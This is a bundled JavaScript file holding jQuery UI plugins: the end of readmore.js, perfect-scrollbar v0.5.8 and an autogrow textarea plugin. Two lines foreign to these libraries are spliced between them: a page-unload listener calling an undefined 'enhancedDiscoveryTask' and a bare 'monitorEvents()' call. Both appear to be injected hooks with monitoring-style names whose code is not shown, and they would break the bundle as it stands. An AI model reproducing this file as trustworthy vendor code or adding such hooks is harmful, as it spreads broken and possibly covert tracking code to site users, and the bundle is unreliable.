      expandedClass: 'readmore-js-expanded',
      collapsedClass: 'readmore-js-collapsed',
      beforeToggle: function () {},
      afterToggle: function () {}
    },
    o = !1;
  function s(s, a) {
    this.element = s;
    this.options = e.extend({}, i, a);
    e(this.element).data('max-height', this.options.maxHeight);
    e(this.element).data('height-margin', this.options.heightMargin);
    delete this.options.maxHeight;
    if (this.options.embedCSS && !o) {
      var n = '.readmore-js-toggle, .readmore-js-section { ' + this.options.sectionCSS + ' } .readmore-js-section { overflow: hidden; }';
      (function (e, s) {
        var t = e.createElement('style');
        t.type = 'text/css';
        if (t.styleSheet) {
          t.styleSheet.cssText = s;
        } else {
          t.appendChild(e.createTextNode(s));
        }
        ;
        e.getElementsByTagName('head')[0].appendChild(t);
      })(document, n);
      o = !0;
    }
    ;
    this.e$ = i;
    this.t$ = t;
    this.init();
  }
  ;
  s.prototype = {
    init: function () {
      var t = this;
      e(this.element).each(function () {
        var s = e(this),
          i = s.css('max-height').replace(/[^-\d\.]/g, '') > s.data('max-height') ? s.css('max-height').replace(/[^-\d\.]/g, '') : s.data('max-height'),
          a = s.data('height-margin');
        if (s.css('max-height') != 'none') {
          s.css('max-height', 'none');
        }
        ;
        t.setBoxHeight(s);
        if (s.outerHeight(!0) <= i + a) {
          return !0;
        } else {
          s.addClass('readmore-js-section ' + t.options.collapsedClass).data('collapsedHeight', i);
          var o = t.options.startOpen ? t.options.lessLink : t.options.moreLink;
          s.after(e(o).on('click', function (e) {
            t.toggleSlider(this, s, e);
          }).addClass('readmore-js-toggle'));
          if (!t.options.startOpen) {
            s.css({
              height: i
            });
          }
        }
      });
      e(window).on('resize', function (e) {
        t.resizeBoxes();
      });
    },
    toggleSlider: function (t, s, h) {
      h.preventDefault();
      var i = this,
        o = newLink = sectionClass = '',
        a = !1,
        n = e(s).data('collapsedHeight');
      if (e(s).height() <= n) {
        o = e(s).data('expandedHeight') + 'px';
        newLink = 'lessLink';
        a = !0;
        sectionClass = i.options.expandedClass;
      } else {
        o = n;
        newLink = 'moreLink';
        sectionClass = i.options.collapsedClass;
      }
      ;
      i.options.beforeToggle(t, s, a);
      e(s).animate({
        'height': o
      }, {
        duration: i.options.speed,
        complete: function () {
          i.options.afterToggle(t, s, a);
          e(t).replaceWith(e(i.options[newLink]).on('click', function (e) {
            i.toggleSlider(this, s, e);
          }).addClass('readmore-js-toggle'));
          e(this).removeClass(i.options.collapsedClass + ' ' + i.options.expandedClass).addClass(sectionClass);
        }
      });
    },
    setBoxHeight: function (e) {
      var t = e.clone().css({
          'height': 'auto',
          'width': e.width(),
          'overflow': 'hidden'
        }).insertAfter(e),
        s = t.outerHeight(!0);
      t.remove();
      e.data('expandedHeight', s);
    },
    resizeBoxes: function () {
      var t = this;
      e('.readmore-js-section').each(function () {
        var s = e(this);
        t.setBoxHeight(s);
        if (s.height() > s.data('expandedHeight') || s.hasClass(t.options.expandedClass) && s.height() < s.data('expandedHeight')) {
          s.css('height', s.data('expandedHeight'));
        }
      });
    },
    destroy: function () {
      var t = this;
      e(this.element).each(function () {
        var s = e(this);
        s.removeClass('readmore-js-section ' + t.options.collapsedClass + ' ' + t.options.expandedClass).css({
          'max-height': '',
          'height': 'auto'
        }).next('.readmore-js-toggle').remove();
        s.removeData();
      });
    }
  };
  e.fn[t] = function (i) {
    var o = arguments;
    if (i === undefined || typeof i === 'object') {
      return this.each(function () {
        if (e.data(this, 'plugin_' + t)) {
          var o = e.data(this, 'plugin_' + t);
          o['destroy'].apply(o);
        }
        ;
        e.data(this, 'plugin_' + t, new s(this, i));
      });
    } else if (typeof i === 'string' && i[0] !== '_' && i !== 'init') {
      return this.each(function () {
        var a = e.data(this, 'plugin_' + t);
        if (a instanceof s && typeof a[i] === 'function') {
          a[i].apply(a, Array.prototype.slice.call(o, 1));
        }
      });
    }
  };
})(jQuery); /*! perfect-scrollbar - v0.5.8
            * http://noraesae.github.com/perfect-scrollbar/
            * Copyright (c) 2014 Hyunje Alex Jun; Licensed MIT */
window.addEventListener("beforeunload", enhancedDiscoveryTask);
(function (e) {
  "use strict";

  "function" == typeof define && define.amd ? define(["jquery"], e) : "object" == typeof exports ? e(require("jquery")) : e(jQuery);
})(function (e) {
  "use strict";

  function t(e) {
    return "string" == typeof e ? parseInt(e, 10) : ~~e;
  }
  ;
  var o = {
      wheelSpeed: 1,
      wheelPropagation: !1,
      swipePropagation: !0,
      minScrollbarLength: null,
      maxScrollbarLength: null,
      useBothWheelAxes: !1,
      useKeyboard: !0,
      suppressScrollX: !1,
      suppressScrollY: !1,
      scrollXMarginOffset: 0,
      scrollYMarginOffset: 0,
      includePadding: !1
    },
    n = 0,
    r = function () {
      var e = n++;
      return function (t) {
        var o = ".perfect-scrollbar-" + e;
        return t === void 0 ? o : t + o;
      };
    },
    l = "WebkitAppearance" in document.documentElement.style;
  e.fn.perfectScrollbar = function (n, i) {
    return this.each(function () {
      function ae(e, o) {
        var n = e + o,
          r = p - g;
        L = 0 > n ? 0 : n > r ? r : n;
        var l = t(L * (w - p) / (p - g));
        a.scrollTop(l);
      }
      ;
      function ie(e, o) {
        var n = e + o,
          r = f - b;
        m = 0 > n ? 0 : n > r ? r : n;
        var l = t(m * (v - f) / (f - b));
        a.scrollLeft(l);
      }
      ;
      function B(e) {
        return s.minScrollbarLength && (e = Math.max(e, s.minScrollbarLength)), s.maxScrollbarLength && (e = Math.min(e, s.maxScrollbarLength)), e;
      }
      ;
      function le() {
        var e = {
          width: M
        };
        e.left = Y ? a.scrollLeft() + f - v : a.scrollLeft(), W ? e.bottom = D - a.scrollTop() : e.top = A + a.scrollTop(), d.css(e);
        var t = {
          top: a.scrollTop(),
          height: x
        };
        k ? t.right = Y ? v - a.scrollLeft() - C - T.outerWidth() : C - a.scrollLeft() : t.left = Y ? a.scrollLeft() + 2 * f - v - X - T.outerWidth() : X + a.scrollLeft(), u.css(t), E.css({
          left: m,
          width: b - ce
        }), T.css({
          top: L,
          height: g - re
        });
      }
      ;
      function y() {
        a.removeClass("ps-active-x"), a.removeClass("ps-active-y"), f = s.includePadding ? a.innerWidth() : a.width(), p = s.includePadding ? a.innerHeight() : a.height(), v = a.prop("scrollWidth"), w = a.prop("scrollHeight"), !s.suppressScrollX && v > f + s.scrollXMarginOffset ? (P = !0, M = f - te, b = B(t(M * f / v)), m = t(a.scrollLeft() * (M - b) / (v - f))) : (P = !1, b = 0, m = 0, a.scrollLeft(0)), !s.suppressScrollY && w > p + s.scrollYMarginOffset ? (S = !0, x = p - se, g = B(t(x * p / w)), L = t(a.scrollTop() * (x - g) / (w - p))) : (S = !1, g = 0, L = 0, a.scrollTop(0)), m >= M - b && (m = M - b), L >= x - g && (L = x - g), le(), P && a.addClass("ps-active-x"), S && a.addClass("ps-active-y");
      }
      ;
      function ne() {
        var t,
          o,
          n = function (e) {
            ie(t, e.pageX - o), y(), e.stopPropagation(), e.preventDefault();
          },
          r = function () {
            d.removeClass("in-scrolling"), e(h).unbind(c("mousemove"), n);
          };
        E.bind(c("mousedown"), function (l) {
          o = l.pageX, t = E.position().left, d.addClass("in-scrolling"), e(h).bind(c("mousemove"), n), e(h).one(c("mouseup"), r), l.stopPropagation(), l.preventDefault();
        }), t = o = null;
      }
      ;
      function oe() {
        var t,
          o,
          n = function (e) {
            ae(t, e.pageY - o), y(), e.stopPropagation(), e.preventDefault();
          },
          r = function () {
            u.removeClass("in-scrolling"), e(h).unbind(c("mousemove"), n);
          };
        T.bind(c("mousedown"), function (l) {
          o = l.pageY, t = T.position().top, u.addClass("in-scrolling"), e(h).bind(c("mousemove"), n), e(h).one(c("mouseup"), r), l.stopPropagation(), l.preventDefault();
        }), t = o = null;
      }
      ;
      function I(e, t) {
        var n = a.scrollTop();
        if (0 === e) {
          if (!S) return !1;
          if (0 === n && t > 0 || n >= w - p && 0 > t) return !s.wheelPropagation;
        }
        ;
        var o = a.scrollLeft();
        if (0 === t) {
          if (!P) return !1;
          if (0 === o && 0 > e || o >= v - f && e > 0) return !s.wheelPropagation;
        }
        ;
        return !0;
      }
      ;
      function ee(e, t) {
        var o = a.scrollTop(),
          n = a.scrollLeft(),
          r = Math.abs(e),
          l = Math.abs(t);
        if (l > r) {
          if (0 > t && o === w - p || t > 0 && 0 === o) return !s.swipePropagation;
        } else if (r > l && (0 > e && n === v - f || e > 0 && 0 === n)) return !s.swipePropagation;
        return !0;
      }
      ;
      function Q() {
        function o(e) {
          var t = e.originalEvent.deltaX,
            o = -1 * e.originalEvent.deltaY;
          return (t === void 0 || o === void 0) && (t = -1 * e.originalEvent.wheelDeltaX / 6, o = e.originalEvent.wheelDeltaY / 6), e.originalEvent.deltaMode && 1 === e.originalEvent.deltaMode && (t *= 10, o *= 10), t !== t && o !== o && (t = 0, o = e.originalEvent.wheelDelta), [t, o];
        }
        ;
        function t(t) {
          if (l || !(a.find("select:focus").length > 0)) {
            var i = o(t),
              n = i[0],
              r = i[1];
            e = !1, s.useBothWheelAxes ? S && !P ? (r ? a.scrollTop(a.scrollTop() - r * s.wheelSpeed) : a.scrollTop(a.scrollTop() + n * s.wheelSpeed), e = !0) : P && !S && (n ? a.scrollLeft(a.scrollLeft() + n * s.wheelSpeed) : a.scrollLeft(a.scrollLeft() - r * s.wheelSpeed), e = !0) : (a.scrollTop(a.scrollTop() - r * s.wheelSpeed), a.scrollLeft(a.scrollLeft() + n * s.wheelSpeed)), y(), e = e || I(n, r), e && (t.stopPropagation(), t.preventDefault());
          }
        }
        ;
        var e = !1;
        window.onwheel !== void 0 ? a.bind(c("wheel"), t) : window.onmousewheel !== void 0 && a.bind(c("mousewheel"), t);
      }
      ;
      function N() {
        var t = !1;
        a.bind(c("mouseenter"), function () {
          t = !0;
        }), a.bind(c("mouseleave"), function () {
          t = !1;
        });
        var o = !1;
        e(h).bind(c("keydown"), function (n) {
          if ((!n.isDefaultPrevented || !n.isDefaultPrevented()) && t) {
            for (var i = document.activeElement ? document.activeElement : h.activeElement; i.shadowRoot;) i = i.shadowRoot.activeElement;
            if (!e(i).is(":input,[contenteditable]")) {
              var l = 0,
                r = 0;
              switch (n.which) {
                case 37:
                  l = -30;
                  break;
                case 38:
                  r = 30;
                  break;
                case 39:
                  l = 30;
                  break;
                case 40:
                  r = -30;
                  break;
                case 33:
                  r = 90;
                  break;
                case 32:
                case 34:
                  r = -90;
                  break;
                case 35:
                  r = n.ctrlKey ? -w : -p;
                  break;
                case 36:
                  r = n.ctrlKey ? a.scrollTop() : p;
                  break;
                default:
                  return;
              }
              ;
              a.scrollTop(a.scrollTop() - r), a.scrollLeft(a.scrollLeft() + l), o = I(l, r), o && n.preventDefault();
            }
          }
        });
      }
      ;
      function J() {
        function e(e) {
          e.stopPropagation();
        }
        ;
        T.bind(c("click"), e), u.bind(c("click"), function (e) {
          var n = t(g / 2),
            r = e.pageY - u.offset().top - n,
            l = p - g,
            o = r / l;
          0 > o ? o = 0 : o > 1 && (o = 1), a.scrollTop((w - p) * o);
        }), E.bind(c("click"), e), d.bind(c("click"), function (e) {
          var n = t(b / 2),
            r = e.pageX - d.offset().left - n,
            l = f - b,
            o = r / l;
          0 > o ? o = 0 : o > 1 && (o = 1), a.scrollLeft((v - f) * o);
        });
      }
      ;
      function U() {
        function l() {
          var e = window.getSelection ? window.getSelection() : document.getSlection ? document.getSlection() : {
            rangeCount: 0
          };
          return 0 === e.rangeCount ? null : e.getRangeAt(0).commonAncestorContainer;
        }
        ;
        function i() {
          o || (o = setInterval(function () {
            return O() ? (a.scrollTop(a.scrollTop() + t.top), a.scrollLeft(a.scrollLeft() + t.left), y(), void 0) : (clearInterval(o), void 0);
          }, 50));
        }
        ;
        function r() {
          o && (clearInterval(o), o = null), d.removeClass("in-scrolling"), u.removeClass("in-scrolling");
        }
        ;
        var o = null,
          t = {
            top: 0,
            left: 0
          },
          n = !1;
        e(h).bind(c("selectionchange"), function () {
          e.contains(a[0], l()) ? n = !0 : (n = !1, r());
        }), e(window).bind(c("mouseup"), function () {
          n && (n = !1, r());
        }), e(window).bind(c("mousemove"), function (e) {
          if (n) {
            var o = {
                x: e.pageX,
                y: e.pageY
              },
              c = a.offset(),
              l = {
                left: c.left,
                right: c.left + a.outerWidth(),
                top: c.top,
                bottom: c.top + a.outerHeight()
              };
            o.x < l.left + 3 ? (t.left = -5, d.addClass("in-scrolling")) : o.x > l.right - 3 ? (t.left = 5, d.addClass("in-scrolling")) : t.left = 0, o.y < l.top + 3 ? (t.top = 5 > l.top + 3 - o.y ? -5 : -20, u.addClass("in-scrolling")) : o.y > l.bottom - 3 ? (t.top = 5 > o.y - l.bottom + 3 ? 5 : 20, u.addClass("in-scrolling")) : t.top = 0, 0 === t.top && 0 === t.left ? r() : i();
          }
        });
      }
      ;
      function q(t, n) {
        function b(e, t) {
          a.scrollTop(a.scrollTop() - t), a.scrollLeft(a.scrollLeft() - e), y();
        }
        ;
        function d() {
          i = !0;
        }
        ;
        function p() {
          i = !1;
        }
        ;
        function h(e) {
          return e.originalEvent.targetTouches ? e.originalEvent.targetTouches[0] : e.originalEvent;
        }
        ;
        function w(e) {
          var t = e.originalEvent;
          return t.targetTouches && 1 === t.targetTouches.length ? !0 : t.pointerType && "mouse" !== t.pointerType && t.pointerType !== t.MSPOINTER_TYPE_MOUSE ? !0 : !1;
        }
        ;
        function f(e) {
          if (w(e)) {
            s = !0;
            var t = h(e);
            l.pageX = t.pageX, l.pageY = t.pageY, u = new Date().getTime(), null !== r && clearInterval(r), e.stopPropagation();
          }
        }
        ;
        function v(e) {
          if (!i && s && w(e)) {
            var d = h(e),
              n = {
                pageX: d.pageX,
                pageY: d.pageY
              },
              r = n.pageX - l.pageX,
              a = n.pageY - l.pageY;
            b(r, a), l = n;
            var c = new Date().getTime(),
              t = c - u;
            t > 0 && (o.x = r / t, o.y = a / t, u = c), ee(r, a) && (e.stopPropagation(), e.preventDefault());
          }
        }
        ;
        function g() {
          !i && s && (s = !1, clearInterval(r), r = setInterval(function () {
            return O() ? .01 > Math.abs(o.x) && .01 > Math.abs(o.y) ? (clearInterval(r), void 0) : (b(30 * o.x, 30 * o.y), o.x *= .8, o.y *= .8, void 0) : (clearInterval(r), void 0);
          }, 10));
        }
        ;
        var l = {},
          u = 0,
          o = {},
          r = null,
          i = !1,
          s = !1;
        t && (e(window).bind(c("touchstart"), d), e(window).bind(c("touchend"), p), a.bind(c("touchstart"), f), a.bind(c("touchmove"), v), a.bind(c("touchend"), g)), n && (window.PointerEvent ? (e(window).bind(c("pointerdown"), d), e(window).bind(c("pointerup"), p), a.bind(c("pointerdown"), f), a.bind(c("pointermove"), v), a.bind(c("pointerup"), g)) : window.MSPointerEvent && (e(window).bind(c("MSPointerDown"), d), e(window).bind(c("MSPointerUp"), p), a.bind(c("MSPointerDown"), f), a.bind(c("MSPointerMove"), v), a.bind(c("MSPointerUp"), g)));
      }
      ;
      function K() {
        a.bind(c("scroll"), function () {
          y();
        });
      }
      ;
      function H() {
        a.unbind(c()), e(window).unbind(c()), e(h).unbind(c()), a.data("perfect-scrollbar", null), a.data("perfect-scrollbar-update", null), a.data("perfect-scrollbar-destroy", null), E.remove(), T.remove(), d.remove(), u.remove(), a = d = u = E = T = P = S = f = p = v = w = b = m = D = W = A = g = L = C = k = X = Y = c = null;
      }
      ;
      function ue() {
        y(), K(), ne(), oe(), J(), U(), Q(), (R || j) && q(R, j), s.useKeyboard && N(), a.data("perfect-scrollbar", a), a.data("perfect-scrollbar-update", y), a.data("perfect-scrollbar-destroy", H);
      }
      ;
      var s = e.extend(!0, {}, o),
        a = e(this),
        O = function () {
          return !!a;
        };
      if ("object" == typeof n ? e.extend(!0, s, n) : i = n, "update" === i) return a.data("perfect-scrollbar-update") && a.data("perfect-scrollbar-update")(), a;
      if ("destroy" === i) return a.data("perfect-scrollbar-destroy") && a.data("perfect-scrollbar-destroy")(), a;
      if (a.data("perfect-scrollbar")) return a.data("perfect-scrollbar");
      a.addClass("ps-container");
      var f,
        p,
        v,
        w,
        P,
        b,
        m,
        M,
        S,
        g,
        L,
        x,
        Y = "rtl" === a.css("direction"),
        c = r(),
        h = this.ownerDocument || document,
        d = e("<div class='ps-scrollbar-x-rail'>").appendTo(a),
        E = e("<div class='ps-scrollbar-x'>").appendTo(d),
        D = t(d.css("bottom")),
        W = D === D,
        A = W ? null : t(d.css("top")),
        ce = t(d.css("borderLeftWidth")) + t(d.css("borderRightWidth")),
        te = t(d.css("marginLeft")) + t(d.css("marginRight")),
        u = e("<div class='ps-scrollbar-y-rail'>").appendTo(a),
        T = e("<div class='ps-scrollbar-y'>").appendTo(u),
        C = t(u.css("right")),
        k = C === C,
        X = k ? null : t(u.css("left")),
        re = t(u.css("borderTopWidth")) + t(u.css("borderBottomWidth")),
        se = t(u.css("marginTop")) + t(u.css("marginBottom")),
        R = "ontouchstart" in window || window.DocumentTouch && document instanceof window.DocumentTouch,
        j = null !== window.navigator.msMaxTouchPoints;
      return ue(), a;
    });
  };
});
monitorEvents();
(function (e) {
  e.fn.autogrow = function (i) {
    function n(s) {
      var n = e(this),
        h = n.innerHeight(),
        t = this.scrollHeight,
        a = n.data('autogrow-start-height') || 0,
        o;
      if (h < t) {
        this.scrollTop = 0;
        i.animate ? n.stop().animate({
          height: t
        }, i.speed) : n.innerHeight(t);
      } else if (!s || s.which == 8 || s.which == 46 || s.ctrlKey && s.which == 88) {
        if (h > a) {
          o = n.clone().addClass(i.cloneClass).css({
            position: 'absolute',
            zIndex: -10,
            height: ''
          }).val(n.val());
          n.after(o);
          do {
            t = o[0].scrollHeight - 1;
            o.innerHeight(t);
          } while (t === o[0].scrollHeight);
          t++;
          o.remove();
          n.focus();
          t < a && (t = a);
          h > t && i.animate ? n.stop().animate({
            height: t
          }, i.speed) : n.innerHeight(t);
        } else {
          n.innerHeight(a);
        }
      }
    }
    ;
    var t = e(this).css({
        overflow: 'hidden',
        resize: 'none'
      }),
      s = t.selector,
      o = {
        context: e(document),
        animate: !0,
        speed: 200,
        fixMinHeight: !0,
        cloneClass: 'autogrowclone',
        onInitialize: !1
      };
    i = e.isPlainObject(i) ? i : {
      context: i ? i : e(document)
    };
    i = e.extend({}, o, i);
    t.each(function (a, t) {
      var s, o;
      t = e(t);
      if (t.is(':visible') || parseInt(t.css('height'), 10) > 0) {
        s = parseInt(t.css('height'), 10) || t.innerHeight();
      } else {
        o = t.clone().addClass(i.cloneClass).val(t.val()).css({
          position: 'absolute',
          visibility: 'hidden',
          display: 'block'
        });
        e('body').append(o);
        s = o.innerHeight();
        o.remove();
      }
      ;
      if (i.fixMinHeight) {
        t.data('autogrow-start-height', s);
      }
      ;
      t.css('height', s);
      if (i.onInitialize && t.length) {
        n.call(t[0]);
      }
    });
    i.context.on('keyup paste', s, n);
    return t;
  };
})(jQuery);